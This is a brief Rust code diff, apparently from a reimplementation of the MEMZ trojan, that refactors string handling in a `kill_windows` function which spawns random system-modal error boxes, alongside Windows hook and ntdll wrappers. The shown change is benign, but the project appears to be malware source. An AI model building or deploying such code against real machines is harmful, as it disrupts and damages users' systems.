@@ -15,7 +15,6 @@ use windows::Win32::{
 };
 
 use crate::{
-    convert_str::ToPCSTRWrapper,
     data::msg::MSGS,
     ntdll::{
         library::Library,
@@ -26,7 +25,7 @@ use crate::{
         wrap_get_current_thread_id, wrap_get_system_metrics, wrap_messagebox_a,
         wrap_set_windows_hook_ex_a, wrap_unhook_windows_hook_ex, WinError,
     },
-    GMEM_ZEROINIT,
+    GMEM_ZEROINIT, s_v,
 };
 
 /// # Safety
@@ -123,7 +122,7 @@ pub fn kill_windows() -> Result<(), WinError> {
             let random = rng.gen_range(0..=25);
             wrap_messagebox_a(
                 HWND(Default::default()),
-                *MSGS[random as usize].to_pcstr(),
+                s_v!(MSGS[random as usize]),
                 "MEMZ",
                 MB_OK | MB_SYSTEMMODAL | MB_ICONHAND,
             )?;
